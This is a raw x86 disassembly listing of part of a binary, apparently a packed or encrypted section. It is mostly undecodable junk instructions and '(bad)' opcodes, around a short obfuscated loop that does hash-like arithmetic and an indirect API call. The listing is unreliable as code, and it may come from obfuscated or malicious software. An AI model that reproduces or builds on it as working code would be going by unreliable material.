  40eba2:	jmp    0x40ed99
  40eba7:	imul   ebx,DWORD PTR [ebx+0x72cf420f],0x73
  40ebae:	mov    bl,0xda
  40ebb0:	jecxz  0x40eb5f
  40ebb2:	sbb    al,dh
  40ebb4:	(bad)  
  40ebb5:	jb     0x40eba5
  40ebb7:	call   0x7e7f:0x547e7ea5
  40ebbe:	jle    0x40eb81
  40ebc0:	pop    edi
  40ebc1:	inc    ecx
  40ebc2:	push   cs
  40ebc3:	push   esp
  40ebc4:	dec    esp
  40ebc5:	test   BYTE PTR [ebp+0x3a],ah
  40ebc8:	xchg   esi,eax
  40ebc9:	loop   0x40eb84
  40ebcb:	pop    es
  40ebcc:	mov    cs:0xdcc61ba0,eax
  40ebd2:	push   esp
  40ebd3:	in     al,0x2e
  40ebd5:	inc    ebp
  40ebd6:	loopne 0x40ebf3
  40ebd8:	fdivr  QWORD PTR [ecx]
  40ebda:	test   eax,0x54e6b23d
  40ebdf:	mov    ch,0x80
  40ebe1:	mov    dh,0x74
  40ebe3:	test   BYTE PTR [eax],dl
  40ebe5:	shl    DWORD PTR [ecx],1
  40ebe7:	xor    cl,BYTE PTR [edx+ebp*8+0x38]
  40ebeb:	mov    al,ds:0x4fa3431c
  40ebf0:	push   es
  40ebf1:	mov    esp,0x58694633
  40ebf6:	movq   mm4,QWORD PTR [ecx-0x60]
  40ebfa:	inc    ebp
  40ebfb:	aas    
  40ebfc:	das    
  40ebfd:	(bad)  
  40ebfe:	fcmovb st,st(5)
  40ec00:	pop    ebp
  40ec01:	xlat   BYTE PTR ds:[ebx]
  40ec02:	sub    cl,BYTE PTR [esi+0x5c]
  40ec05:	pop    edx
  40ec06:	sbb    BYTE PTR [ecx],dh
  40ec08:	lds    esp,FWORD PTR [eax*8+0x55f6869b]
  40ec0f:	cmp    eax,0xeb6e7ed3
  40ec14:	mov    bh,0xf2
  40ec16:	sub    ebx,DWORD PTR [ecx-0x43a96536]
  40ec1c:	fmul   st(4),st
  40ec1e:	dec    esp
  40ec1f:	mov    bl,0xca
  40ec21:	sbb    bh,BYTE PTR [ebp-0xc035cd]
  40ec27:	dec    DWORD PTR [eax-0x27]
  40ec2a:	add    eax,0x85b4268f
  40ec2f:	and    eax,0x38717caf
  40ec34:	mov    cl,0x5f
  40ec36:	movd   mm2,DWORD PTR [ebp+0x63]
  40ec3a:	not    BYTE PTR [edx+0x5f]
  40ec3d:	aaa    
  40ec3e:	mov    bl,0x35
  40ec40:	mov    ch,0xc3
  40ec42:	int3   
  40ec43:	sub    eax,0x9abd7852
  40ec48:	arpl   WORD PTR [edi-0x77],ax
  40ec4b:	jne    0x40ebd2
  40ec4d:	je     0x40ec26
  40ec4f:	sbb    DWORD PTR [ebx-0x58],esp
  40ec52:	push   0xffffff9b
  40ec54:	jo     0x40eca5
  40ec56:	bound  edi,QWORD PTR [ebx+0x69e7f1d0]
  40ec5c:	ss imul eax,ebp,0xc7c163aa
  40ec63:	dec    edx
  40ec64:	sub    edi,DWORD PTR [ebx+0x6f]
  40ec67:	pop    ds
  40ec68:	enter  0x4123,0x67
  40ec6c:	adc    dl,bh
  40ec6e:	stos   DWORD PTR es:[edi],eax
  40ec6f:	push   edi
  40ec70:	pop    edi
  40ec71:	lods   al,BYTE PTR ds:[esi]
  40ec72:	or     edx,DWORD PTR [ebx]
  40ec74:	arpl   WORD PTR [eax],cx
  40ec76:	mov    esp,ebp
  40ec78:	pop    esp
  40ec79:	xchg   DWORD PTR [ebp-0x5c],ecx
  40ec7c:	js     0x40ec98
  40ec7e:	jge    0x40ec1f
  40ec80:	xor    ebx,edx
  40ec82:	adc    esp,DWORD PTR ds:0xc35c7570
  40ec88:	xlat   BYTE PTR ds:[ebx]
  40ec89:	dec    ebx
  40ec8a:	fiadd  WORD PTR [ebp+eiz*4-0xd540aff]
  40ec91:	inc    ebp
  40ec92:	(bad)  [ebx]
  40ec94:	fldenv [esi+0x2b]
  40ec97:	sbb    eax,0x740aaafd
  40ec9c:	sbb    esp,0xa6923627
  40eca2:	test   eax,0x1c3699ef
  40eca7:	ins    DWORD PTR es:[edi],dx
  40eca8:	or     edi,esi
  40ecaa:	dec    esp
  40ecab:	pop    eax
  40ecac:	in     al,dx
  40ecad:	inc    ebp
  40ecae:	(bad)  
  40ecb0:	sbb    BYTE PTR [ebx],0x39
  40ecb3:	hlt    
  40ecb4:	(bad)  
  40ecb5:	in     al,dx
  40ecb6:	shl    DWORD PTR gs:[ecx-0x17],cl
  40ecba:	xlat   BYTE PTR ds:[ebx]
  40ecbb:	adc    ch,dl
  40ecbd:	imul   ebx,DWORD PTR [edx-0x226b7dca],0x7
  40ecc4:	aaa    
  40ecc5:	retf   0xc996
  40ecc8:	push   ss
  40ecc9:	push   edx
  40ecca:	push   esp
  40eccb:	or     bl,dl
  40eccd:	xchg   ebx,eax
  40ecce:	test   eax,0xdd6237a2
  40ecd3:	test   DWORD PTR [esp+edx*2+0x2e2d201b],esi
  40ecda:	div    BYTE PTR [ecx+esi*1-0x6e]
  40ecde:	or     dh,bh
  40ece0:	adc    edi,DWORD PTR [ecx]
  40ece2:	test   BYTE PTR [edx+0x2a6f137a],0x73
  40ece9:	retf   
  40ecea:	sbb    esp,DWORD PTR [ebx]
  40ecec:	pop    es
  40eced:	or     al,0xf0
  40ecef:	out    dx,eax
  40ecf0:	aas    
  40ecf1:	hlt    
  40ecf2:	sbb    esi,DWORD PTR [eax+0x267959c1]
  40ecf8:	jae    0x40ec83
  40ecfa:	cwde   
  40ecfb:	push   ebp
  40ecfc:	mov    ch,0x47
  40ecfe:	sbb    ah,BYTE PTR [eax]
  40ed00:	stos   BYTE PTR es:[edi],al
  40ed01:	mov    BYTE PTR [eax+0x23],bl
  40ed04:	cli    
  40ed05:	xchg   DWORD PTR [ecx],eax
  40ed07:	aas    
  40ed08:	mov    edi,0xdb6e1b80
  40ed0d:	shr    DWORD PTR [edx],0x8d
  40ed10:	cld    
  40ed11:	inc    ebp
  40ed12:	inc    esp
  40ed13:	popf   
  40ed14:	ins    DWORD PTR es:[edi],dx
  40ed15:	cmp    eax,DWORD PTR [edi+0x30]
  40ed18:	ja     0x40ed72
  40ed1a:	mov    ?,edi
  40ed1c:	cmp    ebx,esi
  40ed1e:	dec    esp
  40ed1f:	push   edi
  40ed20:	cs and eax,0x962cd5b5
  40ed26:	xor    bl,BYTE PTR gs:[eax+0x547d69f3]
  40ed2d:	mov    WORD PTR [ecx+0x4bf44587],es
  40ed33:	fs repz leave 
  40ed36:	push   0xda638077
  40ed3b:	leave  
  40ed3c:	pop    ebp
  40ed3d:	loop   0x40ecd1
  40ed3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed40:	sti    
  40ed41:	xchg   ah,dh
  40ed43:	xchg   esi,eax
  40ed44:	jno    0x40ed80
  40ed46:	test   dh,bl
  40ed48:	cs stos DWORD PTR es:[edi],eax
  40ed4a:	outs   dx,BYTE PTR ds:[esi]
  40ed4b:	cmc    
  40ed4c:	fdiv   st(1),st
  40ed4e:	gs jb  0x40ecd4
  40ed51:	stos   BYTE PTR es:[edi],al
  40ed52:	xor    ah,BYTE PTR [edi-0x6]
  40ed55:	fdivrp st(5),st
  40ed57:	psrld  mm5,QWORD PTR [ecx]
  40ed5a:	push   ss
  40ed5b:	ins    DWORD PTR es:[edi],dx
  40ed5c:	popf   
  40ed5d:	fucompp 
  40ed5f:	adc    al,0x46
  40ed62:	xchg   ecx,eax
  40ed63:	aam    0xcd
  40ed65:	xor    eax,0xa911a700
  40ed6a:	pop    eax
  40ed6b:	ds (bad) 
  40ed6d:	int3   
  40ed6e:	cmp    eax,0xc1657db0
  40ed73:	cmp    bh,dh
  40ed75:	into   
  40ed76:	sbb    DWORD PTR [edx-0x35],ebp
  40ed79:	push   ebx
  40ed7a:	xlat   BYTE PTR ds:[ebx]
  40ed7b:	pop    ss
  40ed7c:	push   esi
  40ed7d:	out    dx,eax
  40ed7e:	icebp  
  40ed7f:	fidivr DWORD PTR [eax-0x6598b2fc]
  40ed85:	mov    ah,0xd9
  40ed87:	mov    esp,0x82909100
  40ed8c:	or     eax,0xaa2ad08f
  40ed91:	sub    edx,DWORD PTR [ebx-0x6b95caec]
  40ed97:	shl    BYTE PTR [edx+0xd2bc233],cl
  40ed9d:	push   ebx
  40ed9e:	ss inc ebx
  40eda0:	add    BYTE PTR [ebx],dh
  40eda2:	repnz mov DWORD PTR ds:0x4336d3,0x18
  40edad:	cmp    DWORD PTR ds:0x4336d3,0x0
  40edb4:	je     0x40edf4
  40edba:	cmp    DWORD PTR ds:0x4336d3,0x20
  40edc1:	jne    0x40ede2
  40edc7:	push   DWORD PTR [ebp-0x14]
  40edca:	push   DWORD PTR [ebp-0xc]
  40edcd:	push   0x5135
  40edd2:	push   0x2d1e
  40edd7:	push   0x400000
  40eddc:	call   DWORD PTR ds:0x4120f0
  40ede2:	mov    ecx,DWORD PTR ds:0x4336d3
  40ede8:	dec    ecx
  40ede9:	mov    DWORD PTR ds:0x4336d3,ecx
  40edef:	jmp    0x40edad
  40edf4:	mov    ecx,0x32729b
  40edf9:	add    esi,ecx
  40edfb:	add    eax,ecx
  40edfd:	imul   eax,esi
  40ee00:	mov    esi,DWORD PTR [ebp+0xc]
  40ee03:	cmp    esi,eax
  40ee05:	jne    0x40ee21
  40ee0b:	mov    eax,DWORD PTR [ebp-0x4]
  40ee0e:	mov    esi,DWORD PTR [ebp-0x8]
  40ee11:	xor    eax,edx
  40ee13:	xor    esi,edx
  40ee15:	add    eax,ecx
  40ee17:	add    esi,ecx
  40ee19:	imul   eax,esi
  40ee1c:	jmp    0x40f053
  40ee21:	mov    eax,DWORD PTR [ebp+0xc]
  40ee24:	mov    eax,DWORD PTR [eax+0x78]
  40ee27:	mov    DWORD PTR [ebp+0xc],eax
  40ee2a:	mov    eax,DWORD PTR [ebp-0x4]
  40ee2d:	mov    esi,DWORD PTR [ebp-0x8]
  40ee30:	xor    eax,edx
  40ee32:	xor    esi,edx
  40ee34:	add    eax,ecx
  40ee36:	add    esi,ecx
  40ee38:	imul   eax,esi
  40ee3b:	mov    esi,DWORD PTR [ebp+0xc]
  40ee3e:	cmp    esi,eax
  40ee40:	mov    eax,DWORD PTR [ebp-0x4]
  40ee43:	je     0x40ee0e
  40ee49:	xor    eax,edx
  40ee4b:	add    eax,ecx
  40ee4d:	mov    ecx,DWORD PTR [ebp+0xc]
  40ee50:	imul   eax,ecx
  40ee53:	add    eax,DWORD PTR [ebp+0x8]
  40ee56:	mov    DWORD PTR [ebp+0xc],eax
  40ee59:	jmp    0x40f050
  40ee5e:	mov    dl,0xbd
  40ee60:	push   0xffffffdc
  40ee62:	jno    0x40ee4d
  40ee64:	mov    al,0x51
  40ee66:	ja     0x40eebe
  40ee68:	sbb    edx,DWORD PTR [edx-0xd6da56]
  40ee6e:	lock mov ds:0x7f547e7e,eax
  40ee74:	jle    0x40eef4
  40ee76:	loope  0x40ee57
  40ee78:	or     al,BYTE PTR ds:0x5e9000f3
  40ee7e:	inc    ebx
  40ee7f:	pop    edx
  40ee80:	xor    ebp,DWORD PTR [ebp-0x220b8f41]
  40ee86:	pop    edi
  40ee87:	pop    ecx
  40ee88:	xor    edi,esi
  40ee8a:	(bad)  
  40ee8b:	xchg   edx,eax
  40ee8c:	mov    dh,0x8c
  40ee8e:	call   0x53d928c8
  40ee93:	xchg   edx,eax
  40ee94:	cdq    
  40ee95:	ficomp WORD PTR [ebp+0x19a1017e]
  40ee9b:	hlt    
  40ee9c:	ja     0x40eebc
  40ee9e:	cmp    cl,cl
  40eea0:	scas   al,BYTE PTR es:[edi]
  40eea1:	pop    eax
  40eea2:	lahf   
  40eea3:	(bad)  
  40eea4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eea5:	dec    edi
  40eea6:	and    eax,0xef210b89
  40eeab:	in     eax,dx
  40eeac:	fs hlt 
  40eeae:	test   DWORD PTR [ebx+0x4ec77289],edx
  40eeb4:	mov    eax,ds:0xeb03fc8a
  40eeb9:	stc    
  40eeba:	loopne 0x40ee53
  40eebc:	mov    bl,0x23
  40eebe:	rcr    ebx,cl
  40eec0:	fist   DWORD PTR [ecx-0x4e]
  40eec3:	jnp    0x40eeb8
  40eec5:	xor    esp,DWORD PTR [eax-0x2d4478ed]
  40eecb:	pop    ebx
  40eecc:	jne    0x40eee9
  40eece:	es mov eax,0xb515f5d7
  40eed4:	lds    eax,FWORD PTR [edi]
  40eed6:	cs sahf 
  40eed8:	retf   0xaa83
  40eedb:	call   0x4e6a:0xac2c1f25
  40eee2:	int    0x27
  40eee4:	sbb    ebx,DWORD PTR [esi+0x7b]
  40eee7:	mov    edi,0xd1422b53
  40eeec:	les    ecx,FWORD PTR [edx+0x43]
  40eeef:	sub    ch,dl
  40eef1:	push   edi
  40eef2:	or     eax,0x359a8f24
  40eef7:	mov    esp,0x2996922b
  40eefc:	push   ebp
  40eefd:	jmp    0x3fb3:0xbd324817
  40ef04:	pop    esp
  40ef05:	das    
  40ef06:	imul   edi,DWORD PTR [ecx],0xf83cbc01
  40ef0c:	and    eax,0x2aadaa8b
  40ef11:	or     DWORD PTR [esp+edi*1-0x7c],edx
  40ef15:	test   BYTE PTR [ecx],0xb1
  40ef18:	test   DWORD PTR cs:0x415507a5,edi
  40ef1f:	in     eax,dx
  40ef20:	pop    es
  40ef21:	je     0x40eedf
  40ef23:	fild   QWORD PTR [esi+0x3cc31b7a]
  40ef29:	cmp    edi,DWORD PTR [edi+0x29ab155d]
  40ef2f:	(bad)  
  40ef30:	adc    eax,0x16a5c5b9
  40ef35:	fdivr  st(0),st
  40ef37:	(bad)  
  40ef38:	sbb    cl,BYTE PTR [ecx+0x34]
  40ef3b:	push   ecx
  40ef3c:	les    ebp,FWORD PTR [edx-0x7106cf5a]
  40ef42:	das    
  40ef43:	mov    ds:0x1ae1c169,eax
  40ef48:	fsubr  DWORD PTR ds:0x5c2441fd
  40ef4e:	pusha  
  40ef4f:	and    BYTE PTR [edx+0x36],dl
  40ef52:	shl    BYTE PTR [bx-0x79],cl
  40ef56:	mov    WORD PTR [esi+0x34],ss
  40ef59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef5a:	cdq    
  40ef5b:	arpl   bx,si
  40ef5d:	fldenv [edx]
  40ef5f:	xor    al,0xff
  40ef61:	pop    esi
  40ef62:	and    BYTE PTR [ecx-0xd23deea],ah
  40ef68:	xor    eax,0x17f845b9
  40ef6d:	add    eax,0x2c81f81e
  40ef72:	push   edi
  40ef73:	ds sti 
  40ef75:	icebp  
  40ef76:	out    dx,eax
  40ef77:	rsm    
  40ef79:	push   ebp
  40ef7a:	(bad)  
  40ef7c:	bound  eax,QWORD PTR [ebx+0x2e]
  40ef7f:	scas   eax,DWORD PTR es:[edi]
  40ef80:	sahf   
  40ef81:	out    0x2,eax
  40ef83:	sub    edi,0xffffffc0
  40ef86:	pop    edi
  40ef87:	or     dl,cl
  40ef89:	mov    ch,0x12
  40ef8b:	xchg   bh,dl
  40ef8d:	fisub  WORD PTR [eax-0x4a]
  40ef90:	out    0x2,al
  40ef92:	dec    ebp
  40ef93:	xor    BYTE PTR [esi-0x3c],cl
  40ef96:	scas   al,BYTE PTR es:[edi]
  40ef97:	mov    ecx,0x94437ee1
  40ef9c:	loope  0x40ef33
  40ef9e:	jg     0x40ef82
  40efa0:	sbb    DWORD PTR [esi-0x74e47472],esi
  40efa6:	jmp    0x40efae
  40efa8:	mov    eax,0xc23f0c1b
  40efad:	adc    dl,BYTE PTR [eax-0x29]
  40efb0:	(bad)  
  40efb1:	neg    edi
  40efb3:	pusha  
  40efb4:	jns    0x40f019
  40efb6:	(bad)  
  40efb7:	push   ss
  40efb8:	and    al,0x99
  40efba:	adc    DWORD PTR [esi-0x75],0x4e
  40efbe:	lock repz pop ds
  40efc1:	pop    edi
  40efc2:	push   ss
  40efc3:	stos   BYTE PTR es:[edi],al
  40efc4:	pop    eax
  40efc5:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40efc7:	inc    edi
  40efc8:	fwait
  40efc9:	sahf   
  40efca:	push   eax
  40efcb:	into   
  40efcc:	fnsave fs:[ebp-0x67245a2b]
  40efd3:	sub    cl,BYTE PTR [eax-0x30]
  40efd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efd7:	in     al,dx
  40efd8:	loopne 0x40f009
  40efda:	or     DWORD PTR [edi],ebp
  40efdc:	out    dx,al
  40efdd:	adc    eax,0x45919104
  40efe2:	cmp    bh,BYTE PTR [eax]
  40efe4:	mov    bl,0x77
  40efe6:	jns    0x40efde
  40efe8:	cmp    ebp,ecx
  40efea:	mov    ds:0xd190279a,eax
  40efef:	(bad)  
  40eff0:	pop    ecx
  40eff1:	ret    
  40eff2:	jg     0x40efca
  40eff4:	dec    edi
  40eff5:	push   0x57
  40eff7:	sub    eax,0xdfa555c8
  40effc:	ja     0x40efb2
  40effe:	mov    al,ds:0x3edea8f7
  40f003:	jne    0x40efa3
  40f005:	loopne 0x40f079
  40f007:	dec    esp
  40f008:	dec    edx
  40f009:	inc    ebx
  40f00a:	sbb    al,0xe3
  40f00c:	retf   0x4d2e
  40f00f:	mov    esi,0x40785e4e
  40f014:	loopne 0x40f01a
  40f016:	(bad)  
  40f017:	stc    
  40f018:	cmp    dl,BYTE PTR [ecx+0x7286ddaa]
  40f01e:	inc    ebx
  40f01f:	mov    eax,ds:0xb32be538
  40f024:	int    0xd4
  40f026:	add    bl,BYTE PTR ds:0xddc3dafa
  40f02c:	push   cs
  40f02d:	test   al,0x25
  40f02f:	btr    DWORD PTR [edi],ebx
  40f032:	in     eax,dx
  40f033:	mov    bl,0xcd
  40f035:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40f037:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f038:	loopne 0x40f080
  40f03a:	xor    esi,ebp
  40f03c:	out    0x82,al
  40f03e:	jp     0x40f01a
  40f040:	xor    eax,0x22d1818c
  40f045:	jmp    0x40efe3
  40f047:	aaa    
  40f048:	repnz cmp al,0xfb
  40f04b:	mov    ah,0x3a
  40f04d:	dec    ebp
  40f04e:	push   ss
  40f04f:	pop    ds
  40f050:	mov    eax,DWORD PTR [ebp+0xc]
  40f053:	pop    esi
  40f054:	leave  
  40f055:	ret    0x8
  40f058:	push   ebp
  40f059:	mov    ebp,esp
  40f05b:	push   ecx
  40f05c:	push   ecx
  40f05d:	inc    DWORD PTR ds:0x43369b
  40f063:	jmp    0x40f382
  40f068:	inc    ecx
  40f069:	iret   
  40f06a:	scas   al,BYTE PTR es:[edi]
  40f06b:	(bad)  
  40f06c:	mov    al,0x67
  40f06e:	jno    0x40f0b9
  40f070:	sub    DWORD PTR ds:0x1e681594,ebx
  40f076:	or     bl,BYTE PTR [esi]
  40f078:	(bad)  
  40f079:	mov    eax,ds:0x7d7c7e7e
  40f07e:	jle    0x40f0fe
  40f080:	sti    
  40f081:	dec    ebx
  40f082:	fs cmp eax,0xbb453b46
  40f088:	xchg   esp,eax
  40f089:	dec    ecx
  40f08a:	in     eax,dx
  40f08b:	jmp    0x13e9:0xbf07618b
  40f092:	data16 ins BYTE PTR es:[edi],dx
  40f094:	aam    0x2d
  40f096:	mov    cl,0x40
  40f098:	adc    DWORD PTR [eax+0x181bfbb8],0xffffffeb
  40f09f:	dec    ebp
  40f0a0:	push   edi
  40f0a1:	jmp    0x40f0f4
  40f0a3:	sbb    esi,ebx
  40f0a5:	fs xor esp,esi
  40f0a8:	(bad)  
  40f0a9:	(bad)  
  40f0aa:	ficomp WORD PTR [ebp-0x61fd4129]
  40f0b0:	sub    ecx,DWORD PTR [esi]
  40f0b2:	lahf   
  40f0b3:	cmp    dh,bl
  40f0b5:	push   0x2ccc8b71
  40f0ba:	dec    edi
  40f0bb:	int3   
  40f0bc:	pop    esi
  40f0bd:	dec    DWORD PTR [ebx]
  40f0bf:	xchg   ecx,eax
  40f0c0:	pop    es
  40f0c1:	data16 jnp 0x40f062
  40f0c4:	arpl   WORD PTR [esi],sp
  40f0c6:	pop    edi
  40f0c7:	pop    ds
  40f0c8:	add    al,0x8b
  40f0ca:	xchg   edx,eax
  40f0cb:	adc    eax,0x1b060417
  40f0d0:	mov    BYTE PTR [esi],cl
  40f0d2:	cmp    ebx,DWORD PTR [edi+0x35fb5977]
  40f0d8:	add    DWORD PTR [edi],eax
  40f0da:	sub    ebp,ebp
  40f0dc:	pop    es
  40f0dd:	or     ah,BYTE PTR [ecx]
  40f0df:	mov    ah,0xa3
  40f0e1:	push   ss
  40f0e2:	pop    edi
  40f0e3:	ins    BYTE PTR es:[edi],dx
  40f0e4:	pop    ebp
  40f0e5:	out    dx,eax
  40f0e6:	xchg   eax,edx
  40f0e8:	pop    esi
  40f0e9:	cmp    BYTE PTR [edi+0x7b7ebdaa],bl
  40f0ef:	inc    edi
  40f0f0:	jns    0x40f105
  40f0f2:	jl     0x40f152
  40f0f4:	popa   
  40f0f5:	js     0x40f0d0
  40f0f7:	scas   eax,DWORD PTR es:[edi]
  40f0f8:	jmp    0x40f0f6
  40f0fa:	sahf   
  40f0fb:	and    BYTE PTR [edx-0x2a09da78],cl
  40f101:	mov    WORD PTR [edx+0xbe7084a],gs
  40f107:	pop    ecx
  40f108:	mov    al,0xae
  40f10a:	sub    DWORD PTR [edx],ecx
  40f10c:	inc    edx
  40f10d:	jp     0x40f14b
  40f10f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f110:	pop    ss
  40f111:	sbb    dh,BYTE PTR [eax+0x7ab930fe]
  40f117:	imul   edi,DWORD PTR [eax-0x4601f32],0x7683bb88
  40f121:	mov    DWORD PTR [edx],ebp
  40f123:	pop    ecx
  40f124:	or     DWORD PTR [eax+eax*1],0x8b11b54a
  40f12b:	loope  0x40f17a
  40f12d:	sbb    eax,0xc3dd3c07
  40f132:	pop    eax
  40f133:	fwait
  40f134:	mov    ss,esi
  40f136:	xlat   BYTE PTR ds:[ebx]
  40f137:	ds popf 
  40f139:	xlat   BYTE PTR ds:[ebx]
  40f13a:	jae    0x40f176
  40f13c:	packssdw mm3,QWORD PTR ds:0x7b66867d
  40f143:	ins    BYTE PTR es:[edi],dx
  40f144:	out    dx,al
  40f145:	adc    eax,DWORD PTR [eax]
  40f147:	mov    ebp,0x30d3fd05
  40f14c:	loopne 0x40f1a9
  40f14e:	jmp    0xce1e0a64
  40f153:	ins    BYTE PTR es:[edi],dx
  40f154:	bound  ecx,QWORD PTR [edx-0x47]
  40f157:	pop    edi
  40f158:	jnp    0x40f117
  40f15a:	pmulhw mm6,QWORD PTR [edx+ebp*4+0x2e5f4491]
  40f162:	mov    ebx,edi
  40f164:	and    al,0x92
  40f166:	aaa    
  40f167:	fiadd  WORD PTR [ebx+ebp*1+0x11b58640]
  40f16e:	mov    bh,dl
  40f170:	pop    esi
  40f171:	sub    eax,DWORD PTR [eax+eax*1-0x15]
  40f175:	sbb    al,0xe6
  40f177:	mov    dl,0xbd
  40f179:	and    eax,0x5694652
  40f17e:	sub    eax,ebx
  40f180:	out    dx,al
  40f181:	mov    ch,0x86
  40f183:	dec    esi
  40f184:	jmp    0xa056cfe1
  40f189:	sar    dh,1
  40f18b:	pop    es
  40f18c:	sub    eax,0x662f427c
  40f191:	sbb    ah,bh
  40f193:	mov    edi,eax
  40f195:	shl    BYTE PTR [edx-0x4d],cl
  40f198:	push   ebp
  40f199:	sbb    ebx,DWORD PTR [edi+0x19]
  40f19c:	dec    ecx
  40f19d:	inc    edi
  40f19e:	adc    ebp,edx
  40f1a0:	inc    edx
  40f1a1:	xor    esp,esp
  40f1a3:	xor    DWORD PTR [edx+edx*1],0xdbcb20c9
  40f1aa:	dec    eax
  40f1ab:	mov    bh,0xfa
  40f1ad:	add    esi,DWORD PTR [edx-0x2e626ec]
  40f1b3:	cmp    eax,DWORD PTR [eax-0x42c8377d]
  40f1b9:	leave  
  40f1ba:	sbb    edi,DWORD PTR [eax]
  40f1bc:	pop    es
  40f1bd:	outs   dx,BYTE PTR ds:[esi]
  40f1be:	jg     0x40f1b6
  40f1c0:	add    eax,DWORD PTR [esi-0x72cc7309]
  40f1c6:	adc    DWORD PTR [ebx+esi*4],ebx
  40f1c9:	add    al,0xa0
  40f1cb:	adc    al,0xae
  40f1cd:	lods   eax,DWORD PTR ds:[esi]
  40f1ce:	stos   BYTE PTR es:[edi],al
  40f1cf:	aaa    
  40f1d0:	jb     0x40f194
  40f1d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1d3:	inc    edx
  40f1d4:	test   esp,0x1cc4d09b
  40f1da:	sar    DWORD PTR ds:[eax+ebp*4-0x26],1
  40f1df:	mov    bl,BYTE PTR [ecx+0x33260ae4]
  40f1e5:	mov    edi,0x7b21afa9
  40f1ea:	push   cs
  40f1eb:	lock push edi
  40f1ed:	mov    fs,WORD PTR [edi-0x4ce0ac40]
  40f1f3:	aad    0x79
  40f1f5:	add    bh,bl
  40f1f7:	nop
  40f1f8:	out    0xd0,al
  40f1fa:	(bad)  
  40f1fb:	loopne 0x40f267
  40f1fd:	or     DWORD PTR [ecx+0x5841076f],0x14bc14fc
  40f207:	cmp    DWORD PTR [edi-0x32],0x63
  40f20b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f20c:	add    eax,0xae3d4f02
  40f211:	outs   dx,DWORD PTR ds:[esi]
  40f212:	fiadd  DWORD PTR [edi]
  40f214:	pushf  
  40f215:	test   DWORD PTR [edi],eax
  40f217:	dec    edx
  40f218:	imul   ecx,DWORD PTR [eax+0x29],0xc07dd13
  40f21f:	retf   0x83cf
  40f222:	aad    0x70
  40f224:	leave  
  40f225:	adc    ebx,DWORD PTR [ebx+0x59]
  40f228:	pop    ds
  40f229:	popf   
  40f22a:	jne    0x40f231
  40f22c:	jecxz  0x40f233
  40f22e:	xor    ecx,ecx
  40f230:	mov    ebp,0x57ae90aa
  40f235:	inc    ebp
  40f236:	mov    dl,0xb
  40f238:	jg     0x40f2a8
  40f23a:	gs das 
  40f23c:	jge    0x40f1fe
  40f23e:	xchg   ebp,eax
  40f23f:	sub    BYTE PTR [edi+0x5440cb67],al
  40f245:	jae    0x40f214
  40f247:	es jmp 0x8330b5b5
  40f24d:	test   DWORD PTR [edi],0xd24df96d
  40f253:	ins    BYTE PTR es:[edi],dx
  40f254:	jb     0x40f2be
  40f256:	push   ecx
  40f257:	pop    ds
  40f258:	push   0xf6714ffd
  40f25d:	pop    ss
  40f25e:	in     al,dx
  40f25f:	mul    BYTE PTR [ecx-0x54]
  40f262:	push   edx
  40f263:	test   BYTE PTR [ebx+esi*1],al
  40f266:	add    al,0xc4
  40f268:	js     0x40f2b1
  40f26a:	or     al,0xaa
  40f26c:	popa   
  40f26d:	xor    ch,BYTE PTR [esi-0x7e]
  40f270:	sub    eax,0xeb490ba8
  40f275:	sti    
  40f276:	lods   eax,DWORD PTR ds:[esi]
  40f277:	jns    0x40f27d
  40f279:	or     bl,BYTE PTR [edi]
  40f27b:	call   ebp
  40f27d:	cmc    
  40f27e:	les    esi,FWORD PTR [eax+0x5c8b8d31]
  40f284:	ja     0x40f301
  40f286:	es scas eax,DWORD PTR es:[edi]
  40f288:	dec    esi
  40f289:	lea    esp,[edi-0x1a747d1e]
  40f28f:	rol    DWORD PTR [ecx+0x2f],cl
  40f292:	jmp    0x9a02:0x9c1e4a7
  40f299:	mov    eax,0x2fa93800
  40f29e:	cmp    ecx,DWORD PTR [esi-0x44995f79]
  40f2a4:	pushf  
  40f2a5:	dec    esi
  40f2a6:	mov    ds:0xf65f4aaf,eax
  40f2ab:	test   DWORD PTR [edx+edi*1-0x2c],ebx
  40f2af:	mov    al,0xc
  40f2b1:	scas   eax,DWORD PTR es:[edi]
  40f2b2:	push   ds
  40f2b3:	or     al,0xb3
  40f2b6:	cmpps  xmm7,XMMWORD PTR [ecx+0x40],0xf6
  40f2bb:	jle    0x40f28e
  40f2bd:	jecxz  0x40f2f5
  40f2bf:	jecxz  0x40f311
  40f2c1:	jge    0x40f273
  40f2c3:	mov    cl,0xb9
  40f2c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2c6:	mov    eax,ds:0x2f5cd236
  40f2cb:	push   0x940a48cd
  40f2d0:	out    0x1b,eax
  40f2d2:	sub    BYTE PTR [ebx],bl
  40f2d4:	(bad)  
  40f2d5:	hlt    
  40f2d6:	add    DWORD PTR [ecx+0x3a],ecx
  40f2d9:	xor    ecx,ebx
  40f2db:	inc    dx
  40f2dd:	push   0x19be07c7
  40f2e2:	pusha  
  40f2e3:	cs jnp 0x40f292
  40f2e6:	jle    0x40f356
  40f2e8:	mov    cl,0xee
  40f2ea:	clc    
  40f2eb:	jge    0x40f289
  40f2ed:	(bad)  
  40f2ee:	shl    DWORD PTR [eax-0x6b],cl
  40f2f1:	cwde   
  40f2f2:	retf   
  40f2f3:	loopne 0x40f285
  40f2f5:	jb     0x40f2fd
  40f2f7:	cmp    al,0xf
  40f2f9:	inc    esp
  40f2fa:	jo     0x40f366
  40f2fc:	xor    BYTE PTR [esi+0x72],bh
  40f2ff:	aas    
  40f300:	sub    bl,BYTE PTR [ecx-0x31]
  40f303:	shl    al,0x6
  40f306:	jo     0x40f2f2
  40f308:	repnz fistp DWORD PTR [ebx+0x8]
  40f30c:	push   ds
  40f30d:	sub    al,0x8
  40f30f:	mov    edx,0xb0dd2f98
  40f314:	hlt    
  40f315:	inc    ebp
  40f316:	out    dx,al
  40f317:	push   esp
  40f318:	cmp    eax,0x84f6b9f2
  40f31d:	data16 or bh,BYTE PTR [edx]
